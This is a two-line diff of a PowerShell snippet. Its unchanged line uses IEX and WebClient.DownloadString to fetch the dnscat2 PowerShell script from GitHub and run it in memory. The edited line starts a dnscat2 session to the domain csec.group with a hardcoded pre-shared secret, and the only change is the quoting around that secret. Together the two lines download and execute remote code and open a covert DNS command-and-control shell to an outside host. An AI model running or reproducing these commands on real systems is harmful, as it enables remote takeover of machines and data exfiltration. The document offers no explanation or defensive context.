@@ -1,2 +1,2 @@
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
-Start-Dnscat2 -Domain csec.group -PreSharedSecret "ac5cd955132c595680a228db0ef7c6b9"
+Start-Dnscat2 -Domain csec.group -PreSharedSecret ac5cd955132c595680a228db0ef7c6b9
